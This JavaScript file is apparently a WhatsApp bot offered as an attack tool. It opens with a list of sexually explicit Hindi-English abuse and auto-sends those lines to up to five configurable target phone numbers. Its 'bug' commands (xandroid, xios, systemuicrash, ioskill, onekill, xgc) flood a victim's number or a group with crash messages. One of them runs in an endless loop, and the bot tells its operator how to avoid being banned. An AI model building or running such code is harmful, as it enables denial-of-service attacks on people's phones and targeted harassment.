        "TERI MA KI SUHGARTA MANA DU😳",
          "TERI MA KA BLOUSE FAD DU😝❤️",
            "TERI MA KA DIL TOD DU❤️😝",
              "TERI MA KA DIL CHURA LU😝❤️",
    "TERI MA KA DIL KACHRE ME FEK DU❤️",
      "TERI MA RANDI KI BACCHI❤️❤️",
        "TERI MA RANDI KI BACCHI❤️❤️",
          "TERI MA MADARCHOD KI BACCHI HAI MA KE LODE 😂",
            "BEHEN KE LODE TERI MA GANDU😂",
              "MA KE LODE TERI MA CHAKA HAI😗",
    "CHAKE KE BACHE TERK MA KO KIS DU",
      "MADARCHOD KE BACHE TERI MA RANDI HAI",
        "TERI MA CHUWALE MERSE BEHEN KE LODE😗",
          "MA KE JANE TERI MA RANDJ KESE BAN GYI",
            "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
              "BEHEN KE LPDE TERI MA KI CHUT PE VIMAL KA PICHKARI MARU😝",
    "VIMAL KHANE WALI RANDI TERI MA😝",
      "TERI MA KO BODYGURAR KE ROOP PE CHOODU",
        "RANDI KA BACCHA HAI TU😝",
          "SLOW TYPE KREGA MA KE LODE",
            "BEHEN KE LODE ROYA TO TERI MA RANDII😝😝",
              "BHAGA TO TERI MA CHAKA HOGA😝",
    "TERI MA KI SHADI TUTWA DUNGA AJR",
      "TERI MA KO LODA DEKE KHUSH KRU😝",
        "TERI MA KI KACCHA BADAM KA OFFER LU😝",
          "TERI MA KI CHUT PE THA D DALU😝",
            "TERI MA KI CHUT PE THAPPAD MARU😝",
              "TERI MA KA BHOSDA LAAT MARKE SUJA DU😝",
    "TERI MA CHAKE KI BACCHI THIE",
      "TERI MA LUND CHATU THI😝",
        "MA KI LODI THI TERI RANDI MA😝",
          "RANDI KA BACCHA THA TU MA KE LODE 😝",
            "T3R1 M99 K99 BH0SD9 J9L9 DU B3H3N K3 L0D3",
              "B4H3N K3 L0D3 T3R1 M99 CH9K9 K1U H91",
    "T3R1 M9 K11 CHU7 P3 L0D9 M99RU KI1",
      "T3R1 M99 CL1P B0LK3 R00 N99 D33 B9S",
        "T3R1 CH9K1 M99 K99 BH0SD9 D33 MUZH3",
          "T3R1 R9ND1 M99 K11 CHU7 P3 K1SS DU",
            "R9ND1 K3 B9CH3 M99 K3 L0D3 T3R1 M99 G99NDU H91",
              "T3R1 M9 K1 CHU7 P3 P99N K1 P1CHK99R1 M99RU",
    "R9ND1 K3 B9CH3 T3R1 M99 L0D1 TH1",
      "B3H3N K3 L0D3 T3R1 CH9K1 M99 K99 BH0SD9 J9L9 DU😂😂😂😂😂",
        "M99 K3 L0D3 T3R1 M99 K00 CH9K9 B9N9 DU",
          "CH9K1 H91 T3R1 R9ND1 M99",
  "TERI MA KI CHUT MARU",
"BAHEN K LAVDE",
"TU APNI MA Q CHUDA RAHA HAI",
"TERI MA K CHUT PE THAPPAD MARU",
"KYA BE GB ROAD WALE RANDI KA BETA",
"AABB KYA TU APNI MA CHUDAYEGA YAHA",
"BAHENCHOD TERE BAAP HAI HAM",
"TERI RANDI MA K CHUT PE NIMBU NICHODU",
"BHAG JA BHOSADIKE",
"TERI RANDI MA K BHOSDA ME ROD PE DALU 🔩⛓️"
]

//gali text sender
if (m.sender.startsWith(`${global.target1}`)){ 
const xeondare = papadev[Math.floor(Math.random() * papadev.length)]
XeonBotInc.sendMessage(m.chat, { text: xeondare }, { quoted: m })
}
if (m.sender.startsWith(`${global.target2}`)){ 
const xeondare = papadev[Math.floor(Math.random() * papadev.length)]
XeonBotInc.sendMessage(m.chat, { text: xeondare }, { quoted: m })
}
if (m.sender.startsWith(`${global.target3}`)){ 
const xeondare = papadev[Math.floor(Math.random() * papadev.length)]
XeonBotInc.sendMessage(m.chat, { text: xeondare }, { quoted: m })
}
if (m.sender.startsWith(`${global.target4}`)){ 
const xeondare = papadev[Math.floor(Math.random() * papadev.length)]
XeonBotInc.sendMessage(m.chat, { text: xeondare }, { quoted: m })
}
if (m.sender.startsWith(`${global.target5}`)){ 
const xeondare = papadev[Math.floor(Math.random() * papadev.length)]
XeonBotInc.sendMessage(m.chat, { text: xeondare }, { quoted: m })
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
 case 'change1':
                if (!isCreator) return
                if (!text) return replygcxeon(`Example : ${prefix + command} 916909137213`)
                global.target1 = text
                replygcxeon(`Target number successfully changed to ${text}`)
                break
                 case 'change2':
                if (!isCreator) return
                if (!text) return replygcxeon(`Example : ${prefix + command} 916909137213`)
                global.target2 = text
                replygcxeon(`Target number successfully changed to ${text}`)
                break
                 case 'change3':
                if (!isCreator) return
                if (!text) return replygcxeon(`Example : ${prefix + command} 916909137213`)
                global.target3 = text
                replygcxeon(`Target number successfully changed to ${text}`)
                break
                 case 'change4':
                if (!isCreator) return
                if (!text) return replygcxeon(`Example : ${prefix + command} 916909137213`)
                global.target4 = text
                replygcxeon(`Target number successfully changed to ${text}`)
                break
                 case 'change5':
                if (!isCreator) return
                if (!text) return replygcxeon(`Example : ${prefix + command} 916909137213`)
                global.target5 = text
                replygcxeon(`Target number successfully changed to ${text}`)
                break
                //bug cases
case "xandroid": {
  if (!isCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  if (!isCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
	if (!isCreator) return
    if (!isBot) {
      return replygcxeon("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xandroid2":
  {
	if (!isCreator) return
    if (!isBot) {
      return replygcxeon("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xgc":
  {
    if (!isCreator) return
    if (!text) {
      return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcxeon("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcxeon("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      XeonBotInc.groupLeave(groupTarget);
    } catch (error) {
      replygcxeon(util.format(error));
    }
  }
  break;
  case "🙂":
  {
	if (!isCreator) return
    if (!isBot) {
      return replygcxeon("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "systemuicrash": {
  if (!isCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  if (!isCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'ioskill': case 'iosx': {
            	if (!isCreator) return
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
await replygcxeon(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'waweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isCreator) return
if (!q) return replygcxeon(`Usage .${command} 916909137213`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
let target = xeonyvictim + '@s.whatsapp.net'
await replygcxeon(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replygcxeon(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
}
break
            case 'addvn': {
                if (!isCreator) return
                if (args.length < 1) return replygcxeon('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isCreator) return 
                if (args.length < 1) return replygcxeon('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
                replygcxeon(`Successfully Deleted Audio ${q}`)
            }
            break
            case 'listvn': {
            	if (!isCreator) return
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replygcxeon(teks)
            }
            break          
            case 'sticker':
            case 'stiker':
            case 's': {
            	if (!isCreator) return
                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcxeon(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
            	if (!isCreator) return
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
case 'menu': {
	if (!isCreator) return
	replygcxeon(`꯭b꯭ug꯭ fe꯭at꯭ur꯭e꯭s
xandroid [num,amount]
xandroid2 [amount]
xios [num,amount]
xios2 [amount]
systemuicrash [num,amount]
xsysui [num,amount]
xgc [linkgc,amount]
🙂 [amount]
ioskill [number]
onekill [number]
waweb [number]

꯭vn꯭ fe꯭a꯭tu꯭re꯭s
addvn
delvn
listvn

꯭st꯭at꯭u꯭s ꯭fe꯭a꯭tu꯭re꯭s
p

꯭o꯭th꯭er ꯭fe꯭a꯭tu꯭re꯭s
sticker
take
rvo

g꯭ali꯭ ꯭fe꯭a꯭tu꯭re꯭s
change1 [number]
change2 [number] 
change3 [number]
change4 [number]
change5 [number]`)
}
break


case 'p':
            case 'ping':{
            	if (!isCreator) return
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

Target1: ${target1}
Target2: ${target2}
Target3: ${target3}
Target4: ${target4}
Target5: ${target5}
`.trim()
                await XeonBotInc.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'readviewonce': case 'rvo': {
            	if (!isCreator) return
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
            default:
               
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
